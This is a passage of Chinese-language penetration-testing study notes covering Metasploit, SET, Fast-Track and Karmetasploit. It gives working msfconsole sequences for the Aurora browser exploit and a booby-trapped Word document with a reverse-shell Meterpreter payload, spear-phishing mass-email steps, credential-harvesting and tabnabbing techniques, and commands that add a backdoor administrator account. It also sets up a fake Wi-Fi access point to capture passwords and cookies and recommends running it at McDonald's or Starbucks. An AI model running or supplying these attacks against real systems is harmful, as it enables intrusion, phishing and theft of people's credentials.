<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/browser/ms10_002_aurora</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">show advanced</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set ReverseConnectRetries 10</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set AutoRunScript migrate –f</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">use priv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getsystem</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2文件格式exploit">2、文件格式exploit<a href="#2文件格式exploit" class="hash-link" aria-label="2、文件格式exploit的直接链接" title="2、文件格式exploit的直接链接">​</a></h3>
<p>利用文件格式的漏洞达到溢出的目的，比如PDF，word，图片等。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use windows/fileformat/ms11_006_createsizeddibsection</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">info</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit</span><br></span></code></pre></div></div>
<p>此时会生成一个msf.doc的word文档，在目标机器上打开此文档，然后本机监听端口等待反弹连接：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LHOST 192.168.1.111</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set LPORT 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit –j</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="九msf-附加模块">九．MSF 附加模块<a href="#九msf-附加模块" class="hash-link" aria-label="九．MSF 附加模块的直接链接" title="九．MSF 附加模块的直接链接">​</a></h2>
<p>包括端口扫描，服务探测，弱口令探测，fuzzer，sql注射等。附加模块没有payload。
模块保存在/opt/framework3/msf3/modules/auxiliary/目录中的各个子目录下。
可用命令查看全部可用附加模块：<code>msf&gt; show auxiliary</code></p>
<p>例子：
o```
msf&gt; use scanner/http/webdav_scanner
info
show options
set RHOSTS 192.168.1.141,192.168.1.142,192.168.2.222
run</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">搜索所有http相关扫描模块：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">`search scanner/http`</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">附加模块深层剖析：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<p>cd /opt/framework3/msf3/modules/auxiliary/admin/
wget <a href="http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb" target="_blank" rel="noopener noreferrer">http://carnal0wnage.googlecode.com/svn/trunk/msf3/modules/auxiliary/admin/random/foursqueare.rb</a></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">代码分析:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">```ruby</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">require ‘msf/core’</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">class Metasploit3 &lt; Msf::Auxiliary #导入Auxiliaary类</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#Exploit mixins should be called first</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Exploit::Remote::HttpClient #导入HTTPClient方法</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">include Msf::Auxiliary::Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def initialize</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">super(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Name’ =&gt; ‘Foursquare Location Poster’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Version’ =&gt; ‘$Revision:$’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Description’ =&gt; ‘F*ck with Foursquare,be anywhere you want to be by venue id’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Author’ =&gt; [‘CG’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘License’ =&gt; MSF_LICENSE,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘References’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://groups.google.com/group/foursquare-api’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[‘URL’,’http://www.mikekey.com/im-a-foursquare-cheater/’],</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#todo pass in geocoords instead of venueid,create a venueid, other tom foolery</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">register_options(</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">[</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Opt::RHOST(‘api.foursquare.com’),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘VENUEID’,[true,’foursquare venueid’,’185675’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘USERNAME’,[true,’foursquare username’,’username’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">OptString.new(‘PASSWORD’,[true,’foursquare password’,’password’]),</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">],self.class)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">def run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">begin</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user = datastore[‘USERNAME’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pass = datasore[‘PASSWORD’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">venid = datastore[‘VENUEID’]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">user_pass = Rex::Text.encode_base64(user + “:” + pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">decode = Rex::Text.decode_base64(user_pass)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">postrequest = “twitter=1\n” #add facebook=1 if you want facebook</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Encode User/Pass: #{user_pass}”) #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“Base64 Decode User/Pass: #{decode}”)  #debug</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">res = send_request_cgi({</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘uri’ =&gt; “/v1/checkin?vid=#{venid}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘version’ =&gt; “1.1”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘method’ =&gt; ‘POST’,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘data’ =&gt; postrequest,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘headers’ =&gt;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">{</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Authorization’ =&gt; “Basic #{user_pass}”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">‘Proxy-Connection’ =&gt; “Keep-Alive”,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">},25)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">print_status(“#{res}”)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">rescue ::Timeout::Error, ::Errno::EPIPE =&gt;e</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pus e.message</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">end</span><br></span></code></pre></div></div>
<p>ruby白痴一个，代码我也没看懂，不解释了</p>
<p>如何使用：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; search foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use admin/foursquare</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set VENUEID 2584421</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set USERNAME msf@elwood.net</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set PASSWORD ilovemetasploit</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十社会工程学工具集set">十．社会工程学工具集（SET）<a href="#十社会工程学工具集set" class="hash-link" aria-label="十．社会工程学工具集（SET）的直接链接" title="十．社会工程学工具集（SET）的直接链接">​</a></h2>
<p>主要功能：hacking the human mind。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1set基  本配置">1、SET基本配置：<a href="#1set基本配置" class="hash-link" aria-label="1、SET基本配置：的直接链接" title="1、SET基本配置：的直接链接">​</a></h3>
<p>SET位于/pentest/exploits/set/目录</p>
<p>更新：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /pentest/exploits/set/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">svn update</span><br></span></code></pre></div></div>
<p>配置文件config/set_config，当使用基于web的攻击方式时可以将email功能打开：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">vi config/set_config:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">METASPLOIT_PATH=/opt/framework3/msf3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">WEBATTACK_EMAIL=ON</span><br></span></code></pre></div></div>
<p>使用Java applet attack进行攻击的时候默认使用Microsoft作为发布者名称，如果需要自定义则需要安装JDK并打开配置项：</p>
<p><code>SELF_SIGNED_APPLET=ON</code></p>
<p>SET默认打开AUTO_DETECT项，自动探测本机IP并用于攻击中的各项配置。如果本机是多网卡需要手动指定IP，则需将此项关闭：</p>
<p><code>AUTO_DETECT=OFF</code></p>
<p>SET默  认使用内建的python提供的web server供使用，如需使用apache作为服务则需要本机安装apache并打开配置项：</p>
<p><code>APACHE_SERVER=ON</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2网络钓鱼攻击">2、网络钓鱼攻击:<a href="#2网络钓鱼攻击" class="hash-link" aria-label="2、网络钓鱼攻击:的直接链接" title="2、网络钓鱼攻击:的直接链接">​</a></h3>
<p>Spear-Phishing Attack Vector,利用文件格式漏洞（如PDF）等生成后门并通过email（GMAIL,SENDMAIL,）向目标发送带后门附件的电子邮件，诱使目标打开附件激活后门。</p>
<p>例子：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">./set</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">此时选择菜单1.Spear-Phishing Attack Vectors</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">继续选择：1.Perform a Mass Email Attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择exploit：8.Adobe Collab.collectEmailInfo Buffer Overflow</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择payload：4.Windows Reverse TCP Shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否更改文件名：1.Keep the filename</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发送邮件方式1.Email Attack Single Email Address</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择邮件模板1.Pre-Defined Template</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">5.Status Report</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入收件方email地址：webmanager@exmaple.com</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择发件方式：1.Use a GMAIL Account for your email attack</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">输入发件gmail和密码</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">选择是否立即监听端口等待连接:yes</span><br></span></code></pre></div></div>
<p>此时SET会使用刚才的设定全自动监听指定端口。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3web方式攻击">3、WEB方式攻击：<a href="#3web方式攻击" class="hash-link" aria-label="3、WEB方式攻击：的直接链接" title="3、WEB方式攻击：的直接链接">​</a></h3>
<p>SET可以克隆一个网站并植入后门以此迷惑目标打开此网站并中招。</p>
<ul>
<li>Java Applet方式：最成功的方式之一，并不是利用java的漏洞，而是当目标浏览含后门的仿冒站点时会被询问是否允许执行web中的java applet，一旦点击允许则payload开始运行，目标将被重定向到真实的网站。</li>
<li>用户端（Client-side）web exploit方式：利用用户端存在的软件漏洞，一般使用0day进行攻击的效果最好。</li>
<li>账号密码获取（Username and Password Harvesting）：通过克隆一个目标站并诱使攻击目标登陆，截获其账号密码。例如截获GMAIL密码。</li>
<li>标签页绑架（Tabnabbing）：当目标打开多个标签页浏览网站并切换标签页时，网站侦测到目标的行为并显示让目标等待的信息，恰好目标打开了被绑架的标签页并要求在相似程度惊人的网站里输入登陆凭据，当目标输入之后登陆信息即被截获，  同时被重定向到真实网站。</li>
<li>中间人攻击（Man-Left-in-the-Middle）：此方式使用已经被攻陷的网站的HTTP请求或者网站的XSS漏洞让用户的登陆信息发送至攻击者的HTTP服务器。如果你发现了一个网站的XSS漏洞，可以利用此漏洞构造一个url发送给目标诱使其打开并登陆以截获登陆信息。</li>
<li>Web Jacking：当目标打开我们的网站时会有一个链接显示为正确的web地址，此时若目标打开此仿冒链接会被定向到我们的仿冒网站，其登陆信息会被截获。</li>
<li>混合模式（multi-attack）：可同时使用以上多种攻击手段以提高成功率。</li>
<li>介质感染攻击（Infectious Media Generator）：可以让你生成一张光盘或者u盘，里面包含autorun.inf来运行指定的后门文件或者file-format漏洞文件。</li>
<li>迷你USB人机接口设备（Teensy USB HID）：当电脑插入USB设备且autorun.inf被禁用时，可使用此方法将USB设备模拟成一个键盘或鼠标设备，进而截获目标机器的击键记录。</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="set其他特殊功能">SET其他特殊功能：<a href="#set其他特殊功能" class="hash-link" aria-label="SET其他特殊功能：的直接链接" title="SET其他特殊功能：的直接链接">​</a></h3>
<p>包括SET交互式shell，可用来替代meterpreter；远程管理工具（RATTE）；HTTP隧道，当目标主机只开放HTTP端口对外放行时可通过此功能与主机进行通信；WEB-GUI，包含了常用攻击和无线攻击向导，输入./set-web即可运行。</p>
<p>（SET新版本变动较大，请自行摸索。）</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十一fast-track">十一．FAST-TRACK<a href="#十一fast-track" class="hash-link" aria-label="十一．FAST-TRACK的直接链接" title="十一．FAST-TRACK的直接链接">​</a></h2>
<p>Fast-Track和SET一样都是python编写的，同样是使用MSF提供的payload以及  用户端攻击向导等，作为对MSF的补充，它提供了如MSSQL攻击，更多的exploit，浏览器攻击向导等。fasttrack位于/pentest/exploits/fasttrack/。</p>
<p>交互式模式：<code>./fast-track.py -i</code></p>
<p>命令行模式：<code>./fast-track.py -c</code></p>
<p>Web界面模式：<code>./fast-track.py -g</code></p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="1mssql工具">1、MSSQL工具：<a href="#1mssql工具" class="hash-link" aria-label="1、MSSQL工具：的直接链接" title="1、MSSQL工具：的直接链接">​</a></h3>
<p>MSSQL注入漏洞攻击：</p>
<p>攻击时你只需要输入有注入漏洞的url地址，地址里面用INJECTHERE标识可注入字段，如<a href="http://example.com/show.asp?id=INJECTHERE&amp;date=2012%EF%BC%8Cfast-track%E4%BC%9A%E5%85%A8%E8%87%AA%E5%8A%A8%E6%B3%A8%E5%85%A5%EF%BC%8C%E4%B8%80%E6%97%A6%E6%88%90%E5%8A%9F%E4%BC%9A%E7%BB%99%E4%BD%A0%E8%BF%94%E5%9B%9E%E4%B8%80%E4%B8%AAcmd" target="_blank" rel="noopener noreferrer">http://example.com/show.asp?id=INJECTHERE&amp;date=2012，fast-track会全自动注入，一旦成功会给你返回一个cmd</a> shell。
注入也支持POST参数，如果是POST的话更加简单，只需要你输入url地址，fast-track会自动判断并尝试进行注入。</p>
<p>SQL暴力破解：另外一个实用的功能是暴力破解器（MSSQL Bruter），可以寻找mssql弱口令，一旦获取到一个sa权限的访问权限，将自动返回一个shell。</p>
<p>SQL注入批量扫描器（SQLPwnage）：此功能可扫描指定网段的所有打开80端口的主机，并扫描是否存在sql注入点，一旦发现注入点将自动尝试攻击并通过xp_cmdshell获取系统权限。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="2binary-hex-转换器">2、Binary-HEX 转换器：<a href="#2binary-hex-转换器" class="hash-link" aria-label="2、Binary-HEX 转换器：的直接链接" title="2、Binary-HEX 转换器：的直接链接">​</a></h3>
<p>当你已经进入一个系统且需要上  传可执行文件上去，就可以使用这个工具将可执行的二 进制文件转换为HEX十六进制编码，然后复制粘贴过去即可。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="3批量用户端攻击">3、批量用户端攻击：<a href="#3批量用户端攻击" class="hash-link" aria-label="3、批量用户端攻击：的直接链接" title="3、批量用户端攻击：的直接链接">​</a></h3>
<p>和浏览器攻击差不多，但是增加了对目标的ARP缓冲区和DNS感染（只能是在测试者 和目标处于同一网段的情况下），以及MSF里面没有的浏览器溢出exploit。当目标浏览 恶意网站的时候，fast-track尝试着使用所有的exp对目标机器进行溢出，一旦某个exp 起作用将获取到目标机器的控制权限。</p>
<p>（新版本fasttrack中还加入了Autopwn Automation、Nmap Scripting Engine、Exploits、Payload Generator等新功能。）</p>
<p>脚本化的工具有时确实能减少很多工作时间，但是不能完全依赖于这类自动程度很高的工具，特别是在用这些工具搞不定目标的时候，手工测试的能力往往才是王道，细节决定成败。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十二karmerasploit">十二．KARMERASPLOIT<a href="#十二karmerasploit" class="hash-link" aria-label="十二．KARMERASPLOIT的直接链接" title="十二．KARMERASPLOIT的直接链接">​</a></h2>
<p>Karmetasploit = Karma + Metasploit，也可以说成它是MSF的KARMA实现。</p>
<p>Karma和MSF一样也是使用ruby语言编写的，其功能是建立一个虚假的无线接入点，等待目标连接上钩。与MSF结合可实现更强大的功能。Karmetasploit集成了DNS,POP3，IMAP4，SMTP,FTP,SMB,HTTP等服务用于攻击，模块位于modules/auxiliary/server目录下。</p>
<p>基本配置：</p>
<p>需要的配置不多，首先需要配置一个DHCP服务为目标提供动态IP分配，配置文件：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">default-lease-time 60;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">max-lease-time 72;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ddns-update-style none;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">authoritative;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">log-facility local7;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">subnet 10.0.0.0 netmask 255.255.255.0 {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">range 10.0.0.100 10.0.0.254;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option routers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">option domain-name-servers 10.0.0.1;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span></code></pre></div></div>
<p>将配置文件保存在/etc/dhcp3/dhcpd.conf</p>
<p>下一步下载karma  msf脚本：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget http://www.offensive-security.com/downloads/karma.rc</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#将网卡激活为监听模式：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airmon-ng start wlan0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#创建伪装接入点,-P 可被扫描到，-C 信号发射速率，-e 接入点名称（需要具有欺骗性），-v 指定网卡，mon0为上一步完成后生成的：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">airbase-ng -P -C 30 -e &quot;China-Net-Free&quot; -v mon0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#此时会生成一个名为at0的新网卡接口。</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#接着打开DHCP服务：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ifconfig at0 up 10.0.0.1 netmask 255.255.255.0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">dhcpd3 -cf /etc/dhcp3/dhcpd.conf at0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#检查是否成功启动：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ps aux|grep dhcpd</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">tail -f /var/log/messages</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">#下一步加载karma脚本：</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; resource karma.rc</span><br></span></code></pre></div></div>
<p>等待收获：</p>
<p>当对方打开邮件客  户端并登陆收取邮件，那么他的账户密码将被截获，因为他所连接的DNS和POP3都是虚假的。
当对方打开浏览器准备浏览网页时karma开始截取cookie，建立虚假email，DNS等服务，加载exploits来对付客户端浏览器，如果走运的话可以获取到shell。
总结：建议这招可以拿到麦当劳，星巴克用，效果更好。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十三构建自己的模块编写自己的exploitmeterpreter脚本编程">十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程<a href="#十三构建自己的模块编写自己的exploitmeterpreter脚本编程" class="hash-link" aria-label="十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程的直接链接" title="十三．构建自己的模块，编写自己的exploit，meterpreter脚本编程的直接链接">​</a></h2>
<p>这三章留着后面看，需要有ruby基础等编程基础。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="十四渗透实战演习">十四．渗透实战演习<a href="#十四渗透实战演习" class="hash-link" aria-label="十四．渗透实战演习的直接链接" title="十四．渗透实战演习的直接链接">​</a></h2>
<p>首先需要下载并安装一个专门用来练习渗透的虚拟机Metasploitable：</p>
<p><a href="http://updates.metasploit.com/data/Metasploitable.zip.torrent" target="_blank" rel="noopener noreferrer">http://updates.metasploit.com/data/Metasploitable.zip.torrent</a></p>
<p>虚拟机IP：172.16.32.162 用户名密码：msfadmin</p>
<p>WINXP：172.16.32.131   开放80端口 有防火墙</p>
<p>情报收集：</p>
<p><code>nmap -sT -P0 172.16.32.131</code></p>
<p>msfconsole：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">cd /opt/framework3/msf3/</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msfconsole</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use multi/handler</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set payload windows/meterpreter/reverse_tcp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lhost 172.15.32.129</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set lport 443</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">load auto_add_route</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">exploit -j</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run getgui -e -f 8080</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">shell</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net user msf msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">net localgroup administrators msf /add</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">upload nmap.exe</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">nmap.exe -sT -A -P0 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/ftp/ftp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS 172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">msf&gt; use auxiliary/scanner/smtp/smtp_version</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">set RHOSTS  172.16.32.162</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">run</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span 